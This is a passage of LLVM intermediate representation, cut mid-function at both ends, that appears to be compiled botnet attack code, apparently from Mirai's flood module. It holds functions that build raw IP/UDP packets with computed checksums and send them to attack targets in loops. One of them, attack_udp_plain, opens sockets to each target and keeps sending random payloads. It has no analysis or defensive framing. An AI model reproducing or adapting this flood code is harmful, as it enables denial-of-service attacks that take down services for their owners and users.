  %85 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %11, i8* %85, align 1
  %86 = load i32, i32* %6, align 4
  %87 = trunc i32 %86 to i16
  %88 = add i16 %87, 32
  %89 = call zeroext i16 @htons(i16 zeroext %88) #11
  %90 = getelementptr inbounds i8, i8* %80, i64 2
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %13) #11
  %93 = getelementptr inbounds i8, i8* %80, i64 4
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 4
  %95 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %15, i8* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %97 = getelementptr inbounds i8, i8* %80, i64 6
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 17, i8* %99, align 1
  %100 = load i32, i32* @LOCAL_ADDR, align 4
  %101 = getelementptr inbounds i8, i8* %80, i64 12
  %102 = bitcast i8* %101 to i32*
  store i32 %100, i32* %102, align 4
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %81, i32 1
  %104 = load i32, i32* %103, align 4
  %105 = getelementptr inbounds i8, i8* %80, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %19) #11
  %108 = bitcast i8* %83 to i16*
  store i16 %107, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %21) #11
  %110 = getelementptr inbounds i8, i8* %80, i64 22
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = add i16 %87, 12
  %113 = call zeroext i16 @htons(i16 zeroext %112) #11
  %114 = getelementptr inbounds i8, i8* %80, i64 24
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = bitcast i8* %84 to i32*
  store i32 -1, i32* %116, align 4
  %117 = getelementptr inbounds i8, i8* %80, i64 32
  call void @util_memcpy(i8* %117, i8* %22, i32 %86)
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %29
  br i1 %120, label %.lr.ph73.split, label %.preheader.loopexit89

.loopexit.loopexit:                               ; preds = %146
  br label %.loopexit.backedge

.loopexit.loopexit88:                             ; preds = %192
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit88
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %74, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %146
  %121 = phi i32 [ %167, %146 ], [ 0, %.lr.ph.split.us.preheader ]
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %9, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  %126 = getelementptr inbounds i8, i8* %124, i64 20
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = icmp ult i8 %128, 32
  br i1 %129, label %130, label %137

; <label>:130:                                    ; preds = %.lr.ph.split.us
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #11
  %134 = call i32 @htonl(i32 %133) #11
  %135 = getelementptr inbounds i8, i8* %124, i64 16
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

; <label>:137:                                    ; preds = %.lr.ph.split.us, %130
  %138 = getelementptr inbounds i8, i8* %124, i64 4
  %139 = bitcast i8* %138 to i16*
  store i16 0, i16* %139, align 4
  br i1 %76, label %140, label %142

; <label>:140:                                    ; preds = %137
  %141 = bitcast i8* %126 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %140, %137
  %143 = getelementptr inbounds i8, i8* %124, i64 22
  %144 = bitcast i8* %143 to i16*
  br i1 %78, label %145, label %._crit_edge77

._crit_edge77:                                    ; preds = %142
  %.pre80 = load i16, i16* %144, align 2
  br label %146

; <label>:145:                                    ; preds = %142
  store i16 0, i16* %144, align 2
  br label %146

; <label>:146:                                    ; preds = %._crit_edge77, %145
  %147 = phi i16 [ %.pre80, %._crit_edge77 ], [ 0, %145 ]
  %148 = getelementptr inbounds i8, i8* %124, i64 10
  %149 = bitcast i8* %148 to i16*
  store i16 0, i16* %149, align 2
  %150 = bitcast i8* %124 to i16*
  %151 = call zeroext i16 @checksum_generic(i16* %150, i32 20)
  store i16 %151, i16* %149, align 2
  %152 = getelementptr inbounds i8, i8* %124, i64 26
  %153 = bitcast i8* %152 to i16*
  store i16 0, i16* %153, align 2
  %154 = getelementptr inbounds i8, i8* %124, i64 24
  %155 = bitcast i8* %154 to i16*
  %156 = load i16, i16* %155, align 2
  %157 = load i32, i32* %6, align 4
  %158 = add i32 %157, 12
  %159 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %125, i8* nonnull %126, i16 zeroext %156, i32 %158)
  store i16 %159, i16* %153, align 2
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0, i32 1
  store i16 %147, i16* %160, align 2
  %161 = sext i32 %157 to i64
  %162 = add nsw i64 %161, 32
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0
  %164 = bitcast %struct.sockaddr_in* %163 to %struct.sockaddr*
  %165 = call i64 @sendto(i32 %23, i8* nonnull %124, i64 %162, i32 16384, %struct.sockaddr* %164, i32 16) #10
  %166 = load i32, i32* %5, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %5, align 4
  %168 = icmp slt i32 %167, %29
  br i1 %168, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %192
  %169 = phi i32 [ %213, %192 ], [ 0, %.lr.ph.split.preheader ]
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %9, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  %174 = getelementptr inbounds i8, i8* %172, i64 20
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 2
  %176 = load i8, i8* %175, align 4
  %177 = icmp ult i8 %176, 32
  br i1 %177, label %178, label %185

; <label>:178:                                    ; preds = %.lr.ph.split
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #11
  %182 = call i32 @htonl(i32 %181) #11
  %183 = getelementptr inbounds i8, i8* %172, i64 16
  %184 = bitcast i8* %183 to i32*
  store i32 %182, i32* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %.lr.ph.split, %178
  br i1 %76, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %174 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  %189 = getelementptr inbounds i8, i8* %172, i64 22
  %190 = bitcast i8* %189 to i16*
  br i1 %78, label %191, label %._crit_edge

._crit_edge:                                      ; preds = %188
  %.pre = load i16, i16* %190, align 2
  br label %192

; <label>:191:                                    ; preds = %188
  store i16 0, i16* %190, align 2
  br label %192

; <label>:192:                                    ; preds = %._crit_edge, %191
  %193 = phi i16 [ %.pre, %._crit_edge ], [ 0, %191 ]
  %194 = getelementptr inbounds i8, i8* %172, i64 10
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  %196 = bitcast i8* %172 to i16*
  %197 = call zeroext i16 @checksum_generic(i16* %196, i32 20)
  store i16 %197, i16* %195, align 2
  %198 = getelementptr inbounds i8, i8* %172, i64 26
  %199 = bitcast i8* %198 to i16*
  store i16 0, i16* %199, align 2
  %200 = getelementptr inbounds i8, i8* %172, i64 24
  %201 = bitcast i8* %200 to i16*
  %202 = load i16, i16* %201, align 2
  %203 = load i32, i32* %6, align 4
  %204 = add i32 %203, 12
  %205 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %173, i8* nonnull %174, i16 zeroext %202, i32 %204)
  store i16 %205, i16* %199, align 2
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 %193, i16* %206, align 2
  %207 = sext i32 %203 to i64
  %208 = add nsw i64 %207, 32
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %210 = bitcast %struct.sockaddr_in* %209 to %struct.sockaddr*
  %211 = call i64 @sendto(i32 %23, i8* nonnull %172, i64 %208, i32 16384, %struct.sockaddr* %210, i32 16) #10
  %212 = load i32, i32* %5, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %5, align 4
  %214 = icmp slt i32 %213, %29
  br i1 %214, label %.lr.ph.split, label %.loopexit.loopexit88

; <label>:215:                                    ; preds = %4, %71
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #10
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #11
  %49 = call i32 @htonl(i32 %48) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #10
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #10
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #11
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #10
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #11
  %90 = call i32 @htonl(i32 %89) #11
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !3

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !6

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !8

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
